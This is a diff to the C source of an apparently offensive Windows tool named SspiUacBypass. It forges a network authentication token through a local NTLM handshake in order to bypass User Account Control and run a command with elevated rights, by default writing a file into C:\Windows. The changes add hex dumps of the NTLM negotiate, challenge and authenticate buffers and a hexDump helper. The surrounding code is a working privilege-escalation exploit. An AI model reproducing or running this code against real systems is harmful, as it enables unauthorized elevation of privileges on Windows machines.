@@ -9,12 +9,14 @@
 #define MAX_MESSAGE_SIZE 12000
 
 #pragma comment (lib, "Secur32.lib")
+#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS
 
 HANDLE ForgeNetworkAuthToken();
 void CheckTokenSession(HANDLE hToken);
 BOOL IsThreadTokenIdentification();
+void hexDump(char* desc, void* addr, int len);
 
-int main(int argc, char* argv[]) 
+int main(int argc, char* argv[])
 {
 	char defaultCmdline[] = "cmd /c \"echo SspiUacBypass > C:\\Windows\\bypassuac.txt\"";
 	char* cmdline = defaultCmdline;
@@ -80,6 +82,8 @@ HANDLE ForgeNetworkAuthToken() {
 		printf("InitializeSecurityContext Type 1 failed with secstatus code 0x%x \n", secStatus);
 		exit(-1);
 	}
+	printf("NTLM Negotiate Type1 buffer (size %d): \n", negotiateBuffer.cbBuffer);
+	hexDump(NULL, negotiateBuffer.pvBuffer, negotiateBuffer.cbBuffer);
 
 	challengeDesc.ulVersion = 0;
 	challengeDesc.cBuffers = 1;
@@ -92,6 +96,8 @@ HANDLE ForgeNetworkAuthToken() {
 		printf("AcceptSecurityContext Type 2 failed with secstatus code 0x%x \n", secStatus);
 		exit(-1);
 	}
+	printf("NTLM Challenge Type2 buffer (size %d): \n", challengeBuffer.cbBuffer);
+	hexDump(NULL, challengeBuffer.pvBuffer, challengeBuffer.cbBuffer);
 
 	authenticateDesc.ulVersion = 0;
 	authenticateDesc.cBuffers = 1;
@@ -104,6 +110,8 @@ HANDLE ForgeNetworkAuthToken() {
 		printf("InitializeSecurityContext Type 3 failed with secstatus code 0x%x \n", secStatus);
 		exit(-1);
 	}
+	printf("NTLM Authenticate Type3 buffer (size %d): \n", authenticateBuffer.cbBuffer);
+	hexDump(NULL, authenticateBuffer.pvBuffer, authenticateBuffer.cbBuffer);
 
 	secStatus = AcceptSecurityContext(NULL, &serverContextHandle, &authenticateDesc, 0, SECURITY_NATIVE_DREP, &serverContextHandle, NULL, &serverContextAttributes, &lifetimeServer);
 	if (!SEC_SUCCESS(secStatus)) {
@@ -141,7 +149,7 @@ BOOL IsThreadTokenIdentification() {
 	HANDLE hTokenImp;
 	SECURITY_IMPERSONATION_LEVEL impLevel;
 	DWORD retLenght = 0;
-	if(!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
+	if (!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
 		printf("OpenThreadToken failed with error code %d \n", GetLastError());
 		exit(-1);
 	}
@@ -154,4 +162,56 @@ BOOL IsThreadTokenIdentification() {
 	else
 		return FALSE;
 	CloseHandle(hTokenImp);
+}
+
+void hexDump(char* desc, void* addr, int len) {
+	int i;
+	unsigned char buff[17];
+	unsigned char* pc = (unsigned char*)addr;
+
+	// Output description if given.
+	if (desc != NULL)
+		printf("%s:\n", desc);
+
+	if (len == 0) {
+		printf("  ZERO LENGTH\n");
+		return;
+	}
+	if (len < 0) {
+		printf("  NEGATIVE LENGTH: %i\n", len);
+		return;
+	}
+
+	// Process every byte in the data.
+	for (i = 0; i < len; i++) {
+		// Multiple of 16 means new line (with line offset).
+
+		if ((i % 16) == 0) {
+			// Just don't print ASCII for the zeroth line.
+			if (i != 0)
+				printf("  %s\n", buff);
+
+			// Output the offset.
+			printf("  %04x ", i);
+		}
+
+		// Now the hex code for the specific character.
+		printf(" %02x", pc[i]);
+
+		// And store a printable ASCII character for later.
+		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
+			buff[i % 16] = '.';
+		else
+			buff[i % 16] = pc[i];
+		buff[(i % 16) + 1] = '\0';
+	}
+
+	// Pad out last line if not exactly 16 characters.
+	while ((i % 16) != 0) {
+		printf("   ");
+		i++;
+	}
+
+	// And print the final ASCII bit.
+	printf("  %s\n", buff);
 }
